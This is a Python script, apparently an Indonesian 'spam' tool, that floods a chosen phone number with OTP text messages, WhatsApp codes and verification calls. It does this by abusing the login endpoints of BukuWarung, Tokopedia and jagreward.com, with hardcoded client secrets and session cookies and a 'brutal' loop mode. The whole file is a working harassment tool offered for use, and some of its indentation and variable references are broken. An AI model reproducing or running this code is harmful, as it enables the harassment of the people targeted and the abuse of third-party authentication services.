import os,sys,time,requests,json,random,re,sys
from requests import post
from requests import get
Bismillahirohmanirrohim = "Aaammiin"
# KOLOR
m = "\x1b[1;91m"
h = "\x1b[1;92m"
k = "\x1b[1;93m"
b = "\x1b[1;94m"
u = "\x1b[1;95m"
l = "\x1b[1;96m"
p = "\x1b[1;97m"
# McybearX !!!
emil=print
usup=input
koin = 0
method = []
sistem = os.system
mx = u+"ʕ"+m+" x"+u+"_"+m+"×"+u+"ʔ"
sup = "\x1b[4;95m               \x1b[0;95m/\x1b[3;91mM\x1b[1;95mcybear\x1b[1;91mX\x1b[0;90m"
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#
# Alamat Ip
#ip = requests.get("https://api.ipify.org").text
# Kolor
m = "\x1b[1;91m"
h = "\x1b[1;92m"
k = "\x1b[1;93m"
b = "\x1b[1;94m"
u = "\x1b[1;95m"
l = "\x1b[1;96m"
p = "\x1b[1;97m"

def animasi(McybearX):
	for suport in McybearX + "\n":
		sys.stdout.write(suport)
		sys.stdout.flush()
		time.sleep(1./100)
def klir():
	sistem("clear")
def logo():
    emil("""
\x1b[1;91m     __  ___ \x1b[1;95m                             \x1b[1;91m _  __
\x1b[1;91m    /  |/  /\x1b[1;95m_____ ____   ____ _ ____ ___  \x1b[1;91m| |/ /
\x1b[1;91m   / /|_/ /\x1b[1;95m/ ___// __ \ / __ `// __ `__ \ \x1b[1;91m|   / 
\x1b[1;91m  / /  / /\x1b[1;97m(__  )/ /_/ // /_/ // / / / / /\x1b[1;91m/   |  
\x1b[1;91m /_/  /_/\x1b[1;97m/____// .___/ \__,_//_/ /_/ /_/\x1b[1;91m/_/|_|  
\x1b[1;91m         \x1b[1;97m     /_/                                  

""")
def menu():
	global nohap
	klir()
	logo()
	emil(" \x1b[1;93m    INFO\x1b[1;97m    : Emil Sayang Usup :v ")
	emil(u+" ["+m+"×"+u+"] "+p+"Author  : "+m+"M"+u+"cybear"+m+"X")
	emil(u+" ["+m+"×"+u+"] "+m+"Youtube "+p+": MBEWLEGS")
	emil(u+" ["+m+"×"+u+"] "+p+"Github  :"+b+" https://github.com/McybearX")
#	emil(u+" ["+m+"×"+u+"] "+p+"IP Kamu : "+b+ip)
	emil(sup)
	emil(u+"\n ["+m+"o1"+u+"]"+p+" Spam Sms "+u+"("+p+"DuniaGames"+u+"/"+p+"telkom"+u+")")
	emil(u+" ["+m+"o2"+u+"]"+p+" Spam Call "+u+"("+p+"BTS"+u+")")
	emil(u+" ["+m+"o3"+u+"]"+p+" Spam Wa "+u+"("+p+"tokped"+u+")")
	emil(u+" ["+m+"o4"+u+"]"+p+" Spam Brutal\n")
	emil(sup)
	puput = usup(mx+p+" No : "+m)
	nohap = usup(mx+p+" Nomor Target : +62")
	if puput=="1" or puput=="01":
		buku_warung(metod)
	elif puput=="2" or puput=="02":
		call_bts()
	elif puput=="3" or puput=="03":
		tokped()
	elif puput=="4" or puput=="04":
		brutal()
	else:
		emil(mx+p+" Pilihan "+m+puput+p+" Gada Di Menu Tod!!!")
		time.sleep(3)
		menu()
def brutal():
	Emil = int(usup(mx+p+"Jumlah Spam : "))
         for love in range(Emil):
          buku_warung_sms()
          tokped()
          call_bts()
          cunuy()
          buku_warung_wa()
def buku_warung_wa():
	metod = "WA"
	buku_warung(metod)
def buku_warung_sms():
	metod = "SMS"
	buku_warung(metod)
def buku_warung(metod):

	pala = {
	"Host": "api-v2.bukuwarung.com",
	"Connection": "keep-alive",
	"Content-Length": "194",
	"sec-ch-ua-mobile": "?1",
	"x-app-version-name": "3.7.2",
	"User-Agent": "Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
	"Content-type": "application/json; charset=utf-8",
	"Access-Control-Allow-Origin": "*",
	"accept": "*/*",
	"x-app-version-code": "3300",
	"Origin": "https://app.bukuwarung.com",
	"Sec-Fetch-Site": "same-site",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://app.bukuwarung.com/",
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	}
	para = {
	"action":"LOGIN_OTP",
	"countryCode":"+62",
	"deviceId":"",
	"phone":nohap,
	"method":metod,
	"clientId":"d504e926-aca8-41ca-ab37-68fe44067e7b",
	"clientSecret":"I7ueetTSL4K1lYioaWlqPyd5I0t7RmBF"
	}
	url = "https://api-v2.bukuwarung.com:443/api/v2/auth/otp/send"
	rek = requests.post(url,headers=pala,json=para)
	haha = json.loads(rek.text)["status"]
	if "OTP_SENT" in haha:
		emil(u+" ["+m+"x"+u+"]"+p+" BukuWarung "+metod+" Sukses")
	else:
		emil(u+" ["+m+"x"+u+"]"+k+" BukuWarung Limit...")
def tokped():
         no = ("0"+nohap)
         InquiryId_xl = "237992422"
         id_xl = "237775262"
         palalo = {
         'User-Agent' : 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
         'Accept-Encoding' : 'gzip, deflate',
         'Connection' : 'keep-alive',
         'Origin' : 'https://accounts.tokopedia.com',
         'Accept' : 'application/json, text/javascript, */*; q=0.01',
         'X-Requested-With' : 'XMLHttpRequest',
         'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
         }
         regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = palalo).text
         _mbew_ = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
         dita = {
         "otp_type" : "116",
         "msisdn" : no,
         "tk" : _mbew_,
         "email" : '',
         "original_param" : "",
         "user_id" : "",
         "signature" : "",
         "number_otp_digit" : "6"
         }
         rek = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-sms', headers = palalo, data = dita).text
         dela = json.loads(rek)
         if 'Anda sudah melakukan 3 kali pengiriman kode, silakan coba lagi dalam 30 menit.' in dela:
                  print(u+" ["+m+"x"+u+"]"+k+" Tokped Limiit...")
         else:
                  print(u+" ["+m+"x"+u+"]"+p+" Tokped Sukses")

def call_bts():
	palalo = {
	"Host": "id.jagreward.com",
	"Connection": "keep-alive",
	"Accept": "*/*",
	"X-Requested-With": "XMLHttpRequest",
	"sec-ch-ua-mobile": "?1",
	"User-Agent": "Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://id.jagreward.com/member/register/",
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	'Cookie': 'PHPSESSID=kvo0um7je1ignbnod57013fbqb; DAPROPS="sjs.webGlRenderer:Mali-G52|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:2.700000047683716|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.415155992.1641991248; _gid=GA1.3.444351545.1641991248; _gat=1'
	}
	link = f"https://id.jagreward.com:443/member/verify-mobile/{nohap}/"
	_emiil_ = requests.get(link,headers=palalo)
	_usupp_ = json.loads(_emiil_.text)
	res = _usupp_["result"]
	pon = _usupp_["message"]
	if "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in pon:
		emil(u+" ["+m+"x"+u+"]"+p+" Call Bts Sukses")
	else:
		emil(u+" ["+m+"x"+u+"]"+k+" Call Bts Limit...")
def cunuy():
	haha = "haha"
if Bismillahirohmanirrohim == "Aaammiin":
	koin += 1
	menu()
